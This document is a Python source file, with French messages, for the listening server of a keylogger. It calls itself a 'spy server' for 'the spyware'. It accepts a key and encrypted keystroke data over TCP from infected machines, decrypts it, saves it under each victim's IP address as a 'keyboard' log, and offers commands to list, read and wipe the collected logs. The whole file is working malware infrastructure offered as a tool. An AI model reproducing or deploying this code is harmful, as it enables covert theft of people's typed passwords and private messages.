import socket
from cryptography.fernet import Fernet
import datetime
import os
import traceback
import argparse

class Server :

    def receive_and_decrypt_file(self,server_port):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind(("0.0.0.0", server_port))
            server_socket.listen(1)

            print(f"Écoute du serveur sur le port {server_port}")

            client_socket, client_address = server_socket.accept()
            print(f"Connexion depuis {client_address}")

            key = client_socket.recv(1024)

            cipher_suite = Fernet(key)

            encrypted_text = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                encrypted_text += chunk

            decrypted_text = cipher_suite.decrypt(encrypted_text)
            directory = "Fichier"
            os.makedirs(directory, exist_ok=True)

            ip_personne = client_address[0]
            filename = os.path.join(directory, f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt")

            with open(filename, "wb") as file:
                file.write(decrypted_text)

            print(f"Fichier reçu, déchiffré et enregistré sous le nom de {filename} avec succès.")

        except Exception as e:
            traceback.print_exc()
            print(f"{e}")
        finally:
            server_socket.close()

    def show_files(self):
        directory = "Fichier"
        if os.path.exists(directory):
            files = os.listdir(directory)
            if files:
                print("Liste des fichiers reçus :")
                for file in files:
                    print(file)
            else:
                print("Aucun fichier n’a encore été reçu.")
        else:
            print("Aucun fichier n’a encore été reçu.")

    def read_file(self,file_name):
        directory = "Fichier"
        file_path = os.path.join(directory, file_name)
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                content = file.read()
                print(f"Contenu du fichier {file_name}:\n{content.decode('utf-8')}")
        else:
            print(f"Fichier {file_name} introuvable.")

    def kill_server(self):
        directory = "Fichier"
        if os.path.exists(directory):
            files = os.listdir(directory)
            for file in files:
                file_path = os.path.join(directory, file)
                os.remove(file_path)
            print("Tous les fichiers supprimés.")
        else:
            print("Aucun fichier à supprimer.")

    def menu(self):
        parser = argparse.ArgumentParser(description="Server espion.")
        parser.add_argument("-l", "--listen", type=int, help="Se met en écoute sur un port TCP")
        parser.add_argument("-s", "--show", action="store_true", help="Affiche les fichiers réceptionnés par le spyware.")
        parser.add_argument("-r", "--readfile", help="Lire le contenue du fichier spécifié.")
        parser.add_argument("-k", "--kill", action="store_true", help="Supprime tous les fichiers récéptionner.")

        args = parser.parse_args()

        if args.listen:
            self.receive_and_decrypt_file(args.listen)
        elif args.show:
            self.show_files()
        elif args.readfile:
            self.read_file(args.readfile)
        elif args.kill:
            self.kill_server()
        else:
            parser.print_help()

if __name__ == "__main__":
    server = Server()
    server.menu()
